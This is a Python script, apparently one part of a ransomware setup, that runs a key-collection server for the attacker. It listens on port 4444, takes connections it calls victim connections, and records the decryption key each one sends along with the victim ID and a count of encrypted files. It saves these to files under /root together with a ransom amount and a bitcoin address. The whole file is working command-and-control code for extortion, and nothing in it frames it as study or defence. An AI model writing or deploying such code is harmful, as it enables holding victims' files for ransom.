#!/usr/bin/env python3
"""
attacker_key_server.py - Run this on Kali FIRST
"""

import socket
import json
from datetime import datetime
import threading

class KeyServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.received_keys = []
        
    def handle_client(self, conn, addr):
        """Handle incoming victim connections."""
        try:
            print(f"\n🎯 New victim connected from: {addr[0]}")
            print(f"⏰ Time: {datetime.now()}")
            
            # Receive the key data
            data = conn.recv(1024).decode('utf-8')
            key_data = json.loads(data)
            
            # Extract the key and victim info
            decryption_key = key_data['key']
            victim_id = key_data.get('victim_id', 'unknown')
            files_encrypted = key_data.get('files_encrypted', 0)
            
            print(f"🔑 Received key: {decryption_key}")
            print(f"👤 Victim ID: {victim_id}")
            print(f"📊 Files encrypted: {files_encrypted}")
            
            # Save key to file
            self.save_key(decryption_key, addr[0], victim_id, files_encrypted)
            
            # Send acknowledgement back to victim
            conn.sendall(b"KEY_RECEIVED_OK")
            
        except Exception as e:
            print(f"❌ Error handling client: {e}")
        finally:
            conn.close()
    
    def save_key(self, key, ip, victim_id, files_encrypted):
        """Save the key with metadata."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"/root/keys/victim_{victim_id}_{timestamp}.key"
        
        # Ensure keys directory exists
        import os
        os.makedirs("/root/keys", exist_ok=True)
        
        key_data = {
            "key": key,
            "victim_ip": ip,
            "victim_id": victim_id,
            "files_encrypted": files_encrypted,
            "timestamp": datetime.now().isoformat(),
            "ransom_amount": 500,
            "bitcoin_address": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"
        }
        
        with open(filename, 'w') as f:
            json.dump(key_data, f, indent=2)
        
        # Also save to master key file
        with open("/root/decryption_keys_master.json", 'a') as f:
            f.write(json.dumps(key_data) + '\n')
        
        print(f"💾 Key saved to: {filename}")
        self.received_keys.append(key_data)
    
    def start_server(self):
        """Start the key server."""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            
            print(f"Ransomware Key Server Started")
            print(f"Listening on {self.host}:{self.port}")
            print(f"Server time: {datetime.now()}")
            print("Waiting for victims to connect...\n")
            
            while True:
                try:
                    conn, addr = server_socket.accept()
                    client_thread = threading.Thread(
                        target=self.handle_client, 
                        args=(conn, addr)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                except KeyboardInterrupt:
                    print("\n Server stopped by user")
                    break
                except Exception as e:
                    print(f" Server error: {e}")

if __name__ == "__main__":
    server = KeyServer()
    server.start_server()
